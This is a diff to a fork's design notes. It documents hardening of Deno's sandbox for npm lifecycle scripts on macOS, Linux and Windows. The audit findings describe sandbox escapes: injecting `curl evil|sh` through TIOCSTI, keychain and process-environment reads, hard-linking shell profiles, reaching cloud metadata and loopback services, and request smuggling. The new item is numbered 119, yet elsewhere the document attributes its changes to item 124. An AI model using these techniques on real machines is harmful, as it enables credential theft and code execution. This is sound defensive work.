@@ -3659,7 +3659,9 @@ where the changes are discussed.
        applies the environment, HOME and Deno clamp quietly; the warning is kept
        for a jail that was asked for (`--jail-scripts`, `jail-scripts=true`, an
        object `jailScripts`, `paranoid`), so every Windows install doesn't print
-       it. (Since item 108 an object that holds only `packages` doesn't count.)
+       it. (Since item 108 an object that holds only `packages` doesn't count.
+       Item 124 reverses this: the warning is printed once per install on a
+       default jail too.)
      - `npm_config_user_agent` now passes into the jail (it names the package
        manager; the `user` in its name had dropped it with the credential keys).
 
@@ -4241,9 +4243,11 @@ where the changes are discussed.
        `sendmsg` / `sendmmsg` with `MSG_FASTOPEN` (a Fast Open send connects
        without `connect(2)`). Landlock matches ports, not addresses: a
        connection to another machine on the proxy's port number (random, per
-       script) is not refused by the kernel. Windows: no OS confinement, as
-       before; the proxy and its environment still apply to the clients that
-       honor them, and Deno is clamped.
+       script) is not refused by the kernel (item 124 adds a network namespace
+       of the script's own where unprivileged user namespaces are allowed, so no
+       such route exists). Windows: no OS confinement, as before; the proxy and
+       its environment still apply to the clients that honor them, and Deno is
+       clamped.
      - **No listening either.** A script without the whole network can't accept
        connections from outside, which would hand data to whoever connects in:
        Seatbelt's `(deny network-inbound (local ip))` (also without any network,
@@ -4281,8 +4285,10 @@ where the changes are discussed.
        Landlock can tell file modes apart per path, and seccomp can't see paths.
        The sweep looks at files whose inode changed since the script started
        (`ctime`, which a script can't set back) and removes rather than clears
-       the bit, so a hard link to a file elsewhere leaves that file alone; a
-       process the script left running could still create one after the sweep.
+       the bit, so a hard link to a file elsewhere leaves that file alone. (A
+       process the script left running could create one after the sweep; since
+       item 124 the script's whole process group is ended before the sweep
+       runs.)
      - **A listed name may not lead to this machine (High).** The proxy allows a
        host by NAME and resolves it itself, so a package's declared host
        (node-pre-gyp's `binary.host`) or a listed name whose DNS an attacker
@@ -4307,7 +4313,11 @@ where the changes are discussed.
        package's deno.json host list when its entry sets `"allowPrivate": true`
        (a mirror on the local network; it needs a `net` host list, a config
        error otherwise, and never covers the hosts a package declares for
-       itself). A name that doesn't resolve is a `502`.
+       itself). A name that doesn't resolve is a `502`. Correction (item 124):
+       until then the IP-literal and `localhost` exemptions DID apply to the
+       hosts a package declares for itself (only `allowPrivate` didn't), so a
+       declared `http://127.0.0.1:5432` or `http://localhost:2375` reached the
+       service; since item 124 a declared host gets no exemption in any form.
      - **Corporate proxies that only take host names
        (`supplyChain.jailScripts.upstreamByName`).** Some upstream proxies
        refuse a `CONNECT` to an address, so jailed scripts that need the network
@@ -4609,6 +4619,222 @@ where the changes are discussed.
      concurrent children each write 256 KiB to a piped stdout with stderr piped
      and quiet; all must finish within 60 s.
 
+119. **`fix(npm)`: the lifecycle-script jail, hardened** (`fix/jail-hardening`,
+     CLI only; `cli/supply_chain/jail.rs`, `cli/supply_chain/jail_proxy.rs`,
+     `cli/supply_chain/sandbox_macos.rs`, `cli/supply_chain/sandbox_linux.rs`,
+     `cli/factory.rs`, `cli/tools/info.rs`, `libs/config/deno_json/mod.rs`,
+     `cli/schemas/config-file.v1.json`, `Cargo.toml`, `Cargo.lock`). The fork's
+     security audit of 2026-10-25 read the jail of items 83, 103, 108 and 111
+     end to end and found it kept its promise ("confines the whole process
+     tree") only where the OS sandbox started closed; these are the fixes (the
+     audit's A-H1 to A-H3, A-M1 to A-M7, A-L1 to A-L5, D-L1 and D-I1).
+     - **macOS: a deny-by-default Seatbelt profile (High).** The profile started
+       with `(allow default)` and denied only writes, credential reads and IP
+       traffic. Everything else was open: `mach-lookup` to every launchd
+       service, so a script could `open x.command` (Terminal runs it unconfined,
+       launched by launchd), `security find-generic-password` (the keychain
+       answers over mach, not through the denied files), `pbpaste`, `osascript`,
+       and read any process's environment through `sysctl
+       kern.procargs2`
+       (the installer's tokens); and `file-link` was unrestricted, so
+       `ln ~/.zshrc node_modules/pkg/z` made the user's shell profile writable
+       through a write root. Now the profile is `(deny
+       default)` and
+       allows only: `file-read*` minus the credential files and the terminals;
+       `file-write*` and `file-link` beneath the roots (both ends: a link from
+       outside is refused) plus the null devices; `file-ioctl` minus the
+       terminals; `process-fork` and `process-exec` (a setuid program such as
+       `/bin/ps` can't start under a profile, as under Linux's `no_new_privs`);
+       `signal` and `process-info*` within the sandbox; `sysctl-read` minus the
+       `kern.proc` prefix (the process table); POSIX semaphores and shared
+       memory; and six mach services (the user database for `getpwuid`,
+       `dirhelper` for `confstr`, logging, the notification center). Refused by
+       name as well, so a later allow can't widen past them: `securityd` /
+       `SecurityServer` / `trustd`, `launchservicesd` / `lsd`, the pasteboard,
+       `tccd`, `dnssd`, `lsopen`, `appleevent-send`, `job-creation`. The network
+       rules are unchanged in effect (`(deny network*)`, the proxy's port, or
+       `(allow network*)` minus Unix sockets but the resolver's). Validated on
+       macOS 15.8 with `sandbox-exec` against `sh`, Deno, `clang` / `make`
+       (through `xcrun`; slower, as before, since its cache under
+       `$DARWIN_USER_CACHE_DIR` is not writable and must not be: a poisoned
+       `xcrun_db` would redirect the user's own `clang`), `cmake`, `git`, `tar`,
+       `curl`, `python3`, and the install scripts of real packages (the matrix
+       below).
+     - **TIOCSTI: a script could type into the user's shell (High).** The script
+       kept the installer's session and controlling terminal, and `/dev/tty` was
+       writable on both OSes, so `ioctl(TIOCSTI)` on `/dev/tty` queued
+       `curl evil|sh` for the shell to run after the install (Linux before 6.2,
+       or with `dev.tty.legacy_tiocsti=1`; macOS on the controlling tty). Now
+       the script's process is a session leader (`setsid` before exec, on both
+       OSes; inherited by everything it starts), so there is no controlling
+       terminal and `/dev/tty` opens with `ENXIO`; `/dev/tty` and `/dev/ttys*`
+       are out of the write rules (and not readable or `ioctl`-able under
+       Seatbelt); and Linux's seccomp refuses `ioctl(TIOCSTI)` and
+       `ioctl(TIOCLINUX)` with `EPERM`, for a terminal opened by path on a
+       kernel that still takes them.
+     - **A package's declared host reached loopback and cloud metadata (High).**
+       The proxy's internal-address check exempted an allow-list entry that is
+       an IP literal, and the name `localhost`, and those exemptions applied to
+       the hosts a package declares for itself (`binary.host`), so a package
+       declaring `http://169.254.169.254`, `http://localhost:2375` (Docker) or
+       `http://127.0.0.1:5432` reached the service through the jail's own proxy
+       (item 111's text claimed otherwise; corrected there). Now an allow-list
+       marked as declared (`AllowList::with_declared`) checks every target: an
+       IP literal in any URL form (`0x7f000001`, `2130706433`, `0177.0.0.1`,
+       `[::ffff:127.0.0.1]`), `localhost`, and every name as it resolves, with
+       no `allowPrivate`. The exemptions stay for entries from the project's own
+       deno.json list.
+     - **Linux: a network namespace of the script's own (Medium).** Landlock's
+       port rule allows the proxy's port number on ANY address, so a script
+       could connect with plain TCP to `<attacker>:<that port>` (one
+       `iptables
+       REDIRECT` rule accepts every port) around the proxy.
+       Where unprivileged user namespaces are allowed, the script's process now
+       `unshare(
+       CLONE_NEWUSER | CLONE_NEWNET)`s between fork and exec,
+       maps its user and group to themselves, brings `lo` up, binds the proxy's
+       listening socket on `127.0.0.1:<port>` inside the namespace (the port is
+       chosen by the installer; nothing else is on that loopback) and hands it
+       to the installer over a socketpair (`SCM_RIGHTS`); the installer accepts
+       on it and dials upstream from the host's network. No route leads anywhere
+       else. This also lets Linux before 6.7 (no Landlock network rules) honour
+       host lists instead of failing closed. Where the namespace can't be had
+       (`user.max_user_namespaces=0`, `kernel.unprivileged_userns_clone=0`,
+       Ubuntu 23.10+'s AppArmor `kernel.apparmor_restrict_unprivileged_userns`),
+       the Landlock port rule applies as before and a one-line warning says so,
+       once per install; `deno info --json` reports it (below).
+     - **A declared host is a request, not a grant (Medium).** A package granted
+       itself the network by declaring `binary.host`, which turned "no network
+       unless allowed" into "network for anyone who asks" (and carried the
+       project's readable source out). Now a declared host is honoured only when
+       the project's deno.json lists it for that package in
+       `supplyChain.jailScripts.knownPackages`
+       (`{ "<name>": ["host",
+       "host:port"] }`; `host` covers every port;
+       the package's own `net` list still replaces the declaration entirely);
+       the others reach nothing, and the install prints, once per package, the
+       host and the exact `packages.<name>.net` line that allows it. An object
+       that holds only `knownPackages` configures the default jail without
+       asking for it, as `packages` does (item 108). denext writes the entries
+       its known-package table has.
+     - **Workspace members' secrets were readable (Medium).** Only the root's
+       and the cwd's `.npmrc` / `.env*` were hidden, one level deep. Now `.env*`
+       (`.env`, `.env.local`, `.envrc`, ...), `.dev.vars`, `.npmrc`, `.netrc`,
+       `.pypirc` and `.git-credentials` are hidden at any depth under the
+       project (to 12 levels; `node_modules`, `.git` and the jail's own
+       directory are not entered; symlinks are not followed), so a monorepo's
+       `apps/web/.env.local` is as hidden as the root's.
+     - **Hard links (Medium):** under the Seatbelt profile above, `file-link` is
+       allowed only when the source lies beneath a write root; Landlock already
+       refused them (`REFER`).
+     - **Forwarded HTTP: one request per upstream connection (Medium).** A
+       forwarded `http://` request's bytes after the head were relayed raw, so a
+       script could pipeline a second request to any host behind an allowed one,
+       through the installer's authenticated upstream proxy
+       (`Proxy-Authorization` is added to the first head only), or smuggle one
+       with a bare LF in a header. Now the head is parsed and refused (`400`)
+       when a line holds a bare CR or LF, `Transfer-Encoding` comes with a
+       `Content-Length` (or isn't `chunked`), two `Content-Length`s differ, or
+       the `Host` header names another host than the URL (domain fronting on a
+       shared address); the `Host` sent upstream is the URL's authority; exactly
+       the declared body is copied (`Content-Length` bytes, or chunked through
+       the last chunk and the trailers) and the server's write side is then
+       closed, so nothing pipelined behind it is sent; the whole response comes
+       back.
+     - **Background processes outlived the jail (Medium).**
+       `nohup sh -c '...'
+       &` survived the script with its sandbox but
+       after the executable sweep, and on Windows unconfined. With the script in
+       its own process group (the `setsid` above), the installer now `SIGKILL`s
+       the whole group when the script ends (or is interrupted), waits for it to
+       be gone, and only then runs the executable sweep. Linux: the installer is
+       a child subreaper (`PR_SET_CHILD_SUBREAPER`), so a descendant the script
+       orphaned becomes the installer's child; the ones it didn't have before
+       the script and that are not in its own session are killed and reaped too
+       (a process that detached from the group with its own `setsid` included).
+       macOS has no subreaper: a descendant that made its own session outlives
+       the group there, sandboxed.
+     - **Degraded platforms say so (Medium).** Windows, Linux without Landlock
+       and macOS without `sandbox-exec` printed nothing for a default jail (item
+       103 kept the warning for a jail asked for). Now every install there
+       prints, once: "jail-scripts: the OS can't confine lifecycle scripts here
+       (<reason>). They still get a scrubbed environment, a temporary HOME and a
+       clamped Deno, but any other program they start (a shell, a compiler,
+       curl) can read and write anything and reach any host." And
+       `deno info --json` carries a `lifecycleJail` object for denext's doctor:
+       `osSandbox` (`"seatbelt"` / `"landlock"` / `"none"`), `reason`,
+       `hostLists` (`"proxy"`: every program is held to the list;
+       `"unconfined"`), `networkNamespace` (Linux), and `warnings` (the lines an
+       install prints here). Windows OS confinement (a restricted token,
+       AppContainer, a Job Object) stays a roadmap item.
+     - **Lows.** `is_internal` covers the rest of RFC 6890's special-purpose
+       ranges (`192.0.0.0/24`, the documentation nets, `198.18.0.0/15`, `224/4`,
+       `240/4`, `255.255.255.255`; IPv4-translated `::ffff:0:a.b.c.d`, local-use
+       NAT64 `64:ff9b:1::/48`, 6to4 `2002::/16` and Teredo `2001::/32` when the
+       IPv4 address they carry is internal, `ff00::/8`). The credentials in a
+       URL-valued setting passed into the jail (`npm_config_registry`,
+       `npm_config_proxy`, `HTTPS_PROXY`, ...) are stripped
+       (`http://user:pass@corp:3128` goes in as `http://corp:3128/`). The
+       executable sweep walks with `openat` / `fstatat` / `unlinkat` relative to
+       directory descriptors opened with `O_NOFOLLOW`, so a directory swapped
+       for a symlink while it runs can't make the installer unlink a file
+       elsewhere, and it runs only after the script's process group is gone. The
+       Deno permission clamp folds `..` in a path list it can't canonicalize (a
+       file that doesn't exist yet), so `--allow-write=../../etc/x` no longer
+       passes as beneath a root.
+     - **Dependencies.** tokio 1.47.1 → 1.54.1 (RUSTSEC-2026-0386, the unsound
+       `AsyncFd` constructors; `signal-hook-mio` 0.2.4 → 0.2.5 and `mio` 1.0.4 →
+       1.2.4 to let it move; `io-uring` dropped from the lock), crypto-bigint
+       0.7.6 (yanked) → 0.7.9. `cargo audit`: no vulnerabilities, no new
+       ignores; the unmaintained-crate warnings and the yanked clipboard-win
+       5.3.0 are as before.
+
+     Validated install scripts (macOS 15.8, the deny-by-default profile,
+     `deno
+     install --allow-scripts` with the jail on by default, each also
+     run with `--no-jail-scripts` to tell a jail failure from a baseline one):
+     esbuild 0.25.5 (postinstall) pass; bcrypt 5.1.1 (node-pre-gyp's download
+     from github.com, granted through `net`) pass; @prisma/engines 5.22.0
+     (binaries.prisma.sh, granted) pass; sharp 0.32.6 fail, not the profile: its
+     libvips download goes through tunnel-agent's `CONNECT`, which
+     `node:_http_client`'s `buildProxyRequestTarget` refuses under
+     `NODE_USE_ENV_PROXY` ("Invalid URL: github.com:443"; the same outside the
+     jail with the variable set, since item 111 set it); better-sqlite3 11.10.0
+     fail, the same tunnel-agent path (prebuild-install), after which its
+     node-gyp fallback fetches node-gyp from registry.npmjs.org, which the
+     package's host list doesn't allow (its unjailed build fails on this machine
+     too); electron 33.4.11 fail, not the profile: extract-zip creates the app
+     bundle's symlinks, which the Deno clamp's path-scoped write refuses (item
+     83's `create symlink: denied`); canvas 2.11.2 and cpu-features 0.0.10 (a
+     node-gyp build) fail unjailed too on this machine, so nothing is
+     attributable; puppeteer 23.11.1: `deno install` ran no postinstall for it,
+     jailed or not, so it was not exercised. No failure was a Seatbelt denial.
+     The tunnel-agent `CONNECT` under `NODE_USE_ENV_PROXY` is a node-compat gap
+     to fix in `_http_client`.
+
+     Tests: `npm/supply_chain_jail` (`escapes_denied_mac`: `/dev/tty`,
+     `TIOCSTI`, the session, the process table, hard links both ways, a `nohup`
+     process gone after the install, `open` (a `.command` and an app),
+     `launchctl list`, the keychain, AppleEvents, the pasteboard;
+     `escapes_denied_linux`: the same minus the macOS services;
+     `declared_download_host_refused` with its hint,
+     `declared_download_host_known_but_internal`,
+     `declared_host_binds_every_program` now reaching nothing,
+     `jailed_windows_default` with the warning, and the probe's
+     `read member
+     .env.local` line in `jailed_linux` / `jailed_mac` /
+     `jailed_windows`), `declared_hosts_get_no_exemption`,
+     `forwarded_heads_are_framed_and_host_tied`,
+     `forwarded_requests_are_not_pipelined` and the new ranges in
+     `internal_addresses` (`cli/supply_chain/jail_proxy.rs`),
+     `declared_hosts_need_a_grant`, `secret_files_at_any_depth`,
+     `url_credentials_stripped`, `clamp_folds_dotdot`,
+     `detached_session_and_group_ended` and the `knownPackages` cases of
+     `package_net` (`cli/supply_chain/jail.rs`), `profile_denies_by_default`
+     (`sandbox_macos`), `seccomp_refuses_tiocsti` (`sandbox_linux`),
+     `knownPackages` in `test_to_supply_chain_config` (`libs/config/deno_json`),
+     and `lifecycleJail` in `info/json`.
+
 The runtime-side parts (1-3, 5-22, 24, 25, 27, 32-37, 41-45, 50, 52, 60-62,
 64-73, 75-77, 80, 82, 87-89, 91, 93, 95, 97, 99-102, 104, 105, 109, 110, 113,
 118) are what the prebuilt `libdenort` carries. The CLI-side parts (for example
@@ -4661,6 +4887,7 @@ under `paranoid`, a weaker one is an error.
 | `jail-scripts`               | `jailScripts`: `true` / `false`, or `{ net, packages }`            | `--jail-scripts` / `--no-jail-scripts` | `true`  | Approved dependencies' lifecycle scripts run confined (item 83; on by default, item 103). `false` opts out, not under `paranoid`.       |
 |                              | `jailScripts.net`                                                  |                                        | `false` | Network for every jailed script.                                                                                                        |
 |                              | `jailScripts.packages.<name>`: `{ env, write, net, executables }`  |                                        |         | A package's exceptions: environment variables passed through, extra writable directories (relative to deno.json), network.              |
+|                              | `jailScripts.knownPackages.<name>`: `[host, ...]`                  |                                        |         | The download hosts the package may declare for itself (`binary.host`); an undeclared or unlisted one reaches nothing (item 124).        |
 | `advisory-check`             | `advisoryCheck`: `"on"` / `"off"` / `"required"`                   |                                        | `on`    | Refuse versions OSV lists as malicious; `required` also refuses when OSV can't be reached (item 84).                                    |
 | `low-download-check`         | `lowDownloadCheck`: `"off"` / `"warn"` / `"prompt"` / `"required"` |                                        | `warn`  | What `deno add` does below the threshold: warn and add; ask in a terminal and refuse without one; also refuse unknown counts (item 85). |
 | `low-download-threshold`     | `lowDownloadThreshold`                                             |                                        | `1000`  | Weekly downloads below which the low-download check applies; `0` turns it off (item 85).                                                |
